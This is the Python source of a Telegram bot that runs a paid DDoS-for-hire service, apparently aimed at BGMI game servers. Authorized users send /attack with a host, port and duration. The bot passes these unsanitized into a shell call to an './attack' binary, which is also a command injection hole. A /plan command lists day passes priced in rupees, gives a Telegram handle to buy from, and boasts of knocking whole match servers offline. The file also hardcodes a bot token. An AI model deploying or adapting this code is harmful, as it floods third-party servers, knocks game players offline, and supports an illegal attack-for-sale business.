#!/usr/bin/python3

import telebot
import subprocess
import requests
import datetime
import os

# insert your Telegram bot token here
bot = telebot.TeleBot('7435461697:AAE3mgqO_z0sJZ2kfRToKsG10sceffOHACY')

# Admin user IDs
admin_id = ["1301017655"]

# File to store allowed user IDs
USER_FILE = "users.txt"

# File to store command logs
LOG_FILE = "log.txt"

# Function to read user IDs from the file
def read_users():
    try:
        with open(USER_FILE, "r") as file:
            return file.read().splitlines()
    except FileNotFoundError:
        return []

# List to store allowed user IDs
allowed_user_ids = read_users()

# Function to log command to the file
def log_command(user_id, target, port, time):
    user_info = bot.get_chat(user_id)
    if user_info.username:
        username = "@" + user_info.username
    else:
        username = f"UserID: {user_id}"
    
    with open(LOG_FILE, "a") as file:  # Open in "append" mode
        file.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nDuration: {time}\n\n")

# Function to clear logs
def clear_logs():
    try:
        with open(LOG_FILE, "r+") as file:
            if file.read() == "":
                response = "Logs are already cleared. No data found."
            else:
                file.truncate(0)
                response = "Logs cleared successfully."
    except FileNotFoundError:
        response = "No logs found to clear."
    return response

# Function to record command logs
def record_command_logs(user_id, command, target=None, port=None, time=None):
    log_entry = f"UserID: {user_id} | Time: {datetime.datetime.now()} | Command: {command}"
    if target:
        log_entry += f" | Target: {target}"
    if port:
        log_entry += f" | Port: {port}"
    if time:
        log_entry += f" | Duration: {time}"
    
    with open(LOG_FILE, "a") as file:
        file.write(log_entry + "\n")

@bot.message_handler(commands=['add'])
def add_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) > 1:
            user_to_add = command[1]
            if user_to_add not in allowed_user_ids:
                allowed_user_ids.append(user_to_add)
                with open(USER_FILE, "a") as file:
                    file.write(f"{user_to_add}\n")
                response = f"User {user_to_add} added successfully."
            else:
                response = "User already exists."
        else:
            response = "Please specify a user ID to add."
    else:
        response = "Only Admin or Owner Can Run This Command 😡."

    bot.reply_to(message, response)

@bot.message_handler(commands=['remove'])
def remove_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) > 1:
            user_to_remove = command[1]
            if user_to_remove in allowed_user_ids:
                allowed_user_ids.remove(user_to_remove)
                with open(USER_FILE, "w") as file:
                    for user_id in allowed_user_ids:
                        file.write(f"{user_id}\n")
                response = f"User {user_to_remove} removed successfully."
            else:
                response = f"User {user_to_remove} not found in the list."
        else:
            response = "Please specify a user ID to remove. Usage: /remove <userid>"
    else:
        response = "Only Admin or Owner Can Run This Command 😡."

    bot.reply_to(message, response)

@bot.message_handler(commands=['clearlogs'])
def clear_logs_command(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        response = clear_logs()
    else:
        response = "Only Admin or Owner Can Run This Command 😡."
    bot.reply_to(message, response)

@bot.message_handler(commands=['allusers'])
def show_all_users(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        try:
            with open(USER_FILE, "r") as file:
                user_ids = file.read().splitlines()
                if user_ids:
                    response = "Authorized users:\n"
                    for user_id in user_ids:
                        try:
                            user_info = bot.get_chat(int(user_id))
                            username = user_info.username
                            response += f"- @{username} (ID: {user_id})\n"
                        except Exception as e:
                            response += f"- User ID: {user_id}\n"
                else:
                    response = "No data found."
        except FileNotFoundError:
            response = "No data found."
    else:
        response = "Only Admin or Owner Can Run This Command 😡."
    bot.reply_to(message, response)

@bot.message_handler(commands=['logs'])
def show_recent_logs(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        if os.path.exists(LOG_FILE) and os.stat(LOG_FILE).st_size > 0:
            try:
                with open(LOG_FILE, "rb") as file:
                    bot.send_document(message.chat.id, file)
            except FileNotFoundError:
                response = "No data found."
                bot.reply_to(message, response)
        else:
            response = "No data found."
            bot.reply_to(message, response)
    else:
        response = "Only Admin or Owner Can Run This Command 😡."
        bot.reply_to(message, response)

@bot.message_handler(commands=['id'])
def show_user_id(message):
    user_id = str(message.chat.id)
    response = f"Your ID: {user_id}"
    bot.reply_to(message, response)

# Function to handle the reply when free users run the /bgmi command
def start_attack_reply(message, target, port, time):
    user_info = message.from_user
    username = user_info.username if user_info.username else user_info.first_name
    
    response = f" 𝐀𝐓𝐓𝐀𝐂𝐊 𝐒𝐓𝐀𝐑𝐓𝐄𝐃💥\n\n𝐇𝐨𝐬𝐭: {target}\n𝐏𝐨𝐫𝐭: {port}\n𝐃𝐮𝐫𝐚𝐭𝐢𝐨𝐧: {time}𝐒𝐞𝐜𝐨𝐧𝐝𝐬\n𝐑𝐮𝐧𝐧𝐢𝐧𝐠:Loby ki chudi succesfully start🤙,\n𝐂𝐨𝐮𝐧𝐭:10,\nYAMRAJ: Koe nhi hai takkr me "
    bot.reply_to(message, response)

# Dictionary to store the last time each user ran the /bgmi command
bgmi_cooldown = {}

COOLDOWN_TIME = 00 # Cooldown time in seconds (0minutes)

# Handler for /attack command
@bot.message_handler(commands=['attack'])
def handle_attack(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        # Check if the user is in admin_id (admins have no cooldown)
        if user_id not in admin_id:
            # Check if the user has run the command before and is still within the cooldown period
            if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < COOLDOWN_TIME:
                response = "You are on cooldown. Please wait 0 minutes before running the /attack command again."
                bot.reply_to(message, response)
                return
            # Update the last time the user ran the command
            bgmi_cooldown[user_id] = datetime.datetime.now()
        
        command = message.text.split()
        if len(command) == 4:  # Updated to accept target, port, and time
            target = command[1]
            port = int(command[2])  # Convert port to integer
            time = int(command[3])  # Convert time to integer
            if time > 300:
                response = "Error: Duration interval must be less than 300 seconds."
            else:
                record_command_logs(user_id, '/attack', target, port, time)
                log_command(user_id, target, port, time)
                start_attack_reply(message, target, port, time)  # Call start_attack_reply function
                full_command = f"./attack {target} {port} {time} 180"
                subprocess.run(full_command, shell=True)
                response = f"𝐀𝐭𝐭𝐚𝐜𝐤 𝐅𝐢𝐧𝐢𝐬𝐡𝐞𝐝💥\n\n𝐇𝐨𝐬𝐭: {target} 𝐏𝐨𝐫𝐭: {port} 𝐃𝐮𝐫𝐚𝐭𝐢𝐨𝐧: {time}𝐒𝐞𝐜𝐨𝐧𝐝𝐬,\nNOTE: FEEDBACK NHI DEA TOH KEY BLOCK KRDUGA🌟🤙"
        else:
            response = "✅Usage: /attack <host> <port> <Duration>"  # Updated command syntax
    else:
        response = "You are not authorized to use this bot.."

    bot.reply_to(message, response)

# Add /mylogs command to display logs recorded for bgmi and website commands
@bot.message_handler(commands=['mylogs'])
def show_command_logs(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        try:
            with open(LOG_FILE, "r") as file:
                command_logs = file.readlines()
                user_logs = [log for log in command_logs if f"UserID: {user_id}" in log]
                if user_logs:
                    response = "Your command logs:\n" + "".join(user_logs)
                else:
                    response = "No command logs found for you."
        except FileNotFoundError:
            response = "No command logs found."
    else:
        response = "You are not authorized to use this bot."

    bot.reply_to(message, response)

@bot.message_handler(commands=['help'])
def show_help(message):
    help_text = '''Available Commands:
/add <user_id> - Add a new user (Admin/Owner only)
/remove <user_id> - Remove a user (Admin/Owner only)
/clearlogs - Clear command logs (Admin/Owner only)
/allusers - Show all authorized users (Admin/Owner only)
/logs - Show recent logs (Admin/Owner only)
/id - Show your user ID
/attack <target> <port> <duration> - Launch an attack
/help - Show this help message
/remove <user_id> - Remove a user (Admin/Owner only)
/plan - Show price list for services
'''
    bot.reply_to(message, help_text)

@bot.message_handler(commands=['plan'])
def welcome_plan(message):
    user_name = message.from_user.first_name
    response = f'''{user_name}, Brother Only 1 Plan Is Powerfull Then Any Other Ddos !!:

Vip 🌟 :
-> Attack Time : 300 (S)
-> After Attack Limit : 10 Sec
-> Concurrents Attack : 300

Price List💸 :
1 Day-->150 Rs
3 Day -->400 Rs
7 Day -->750 Rs

Dm to buy @the_yamraj

Note :- 180 Sec Is Enough If U Uses 300 Sec Attack Then It Can Kill The Whole Match Server In Plan !!
'''
    bot.reply_to(message, response)

@bot.message_handler(commands=['broadcast'])
def broadcast_message(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split(maxsplit=1)
        if len(command) > 1:
            message_to_broadcast = "⚠️ Message to all users by Admin:\n\n" + command[1]
            with open(USER_FILE, "r") as file:
                user_ids = file.read().splitlines()
                for user_id in user_ids:
                    try:
                        bot.send_message(user_id, message_to_broadcast)
                    except Exception as e:
                        print(f"Failed to send broadcast message to user {user_id}: {str(e)}")
            response = "Broadcast message sent successfully to all users."
        else:
            response = "Please provide a message to broadcast."
    else:
        response = "Only Admin or Owner Can Run This Command 😡."

    bot.reply_to(message, response)

bot.polling()